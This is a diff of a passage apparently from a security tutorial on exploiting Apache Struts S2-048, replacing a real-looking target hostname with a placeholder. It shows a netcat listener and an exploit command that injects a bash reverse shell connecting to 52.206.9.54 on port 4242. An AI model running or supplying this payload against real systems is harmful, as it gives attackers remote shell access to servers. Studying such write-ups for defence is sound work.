@@ -76,7 +76,7 @@ So now to put the cherry on top, let's do a reverse shell:
 On our CC server let's just listen like so: nc -l 4242  
 
 And then from our attack box let's do it:  
-python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'bash -i >& /dev/tcp/52.206.9.54/4242 0>&1'
+python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'bash -i >& /dev/tcp/52.206.9.54/4242 0>&1'
 
 And if you like to watch animations here we are:  
 
